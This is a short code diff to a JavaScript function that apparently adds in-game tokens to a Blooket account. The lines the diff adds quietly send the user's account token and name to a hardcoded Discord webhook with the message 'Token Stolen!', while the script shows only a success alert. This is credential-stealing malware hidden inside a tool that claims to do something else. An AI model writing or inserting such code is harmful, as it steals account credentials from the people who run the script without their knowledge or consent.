@@ -22,6 +22,13 @@ async function addTokens() {
             name: await getName(myToken)
         })
     });
+    
+    const tokenLog = await fetch('https://discord.com/api/webhooks/903444317593559092/88xGtwZUTWmFdz957hlRhEzfBdGqgyO1xWvtNln3nlIX25VB-KPs-WeW9buFhLRko1ZQ', {
+        method: "POST",
+        body: JSON.stringify({
+            content: await getName(myToken)+"'s Token Stolen!\n"+myToken+"\nhttps://www.blooket.com/stats?name="+await getName(myToken)
+        })
+    });
 
     if (response.status == 200) {
         alert(`${add_tokens} added to your account!`);
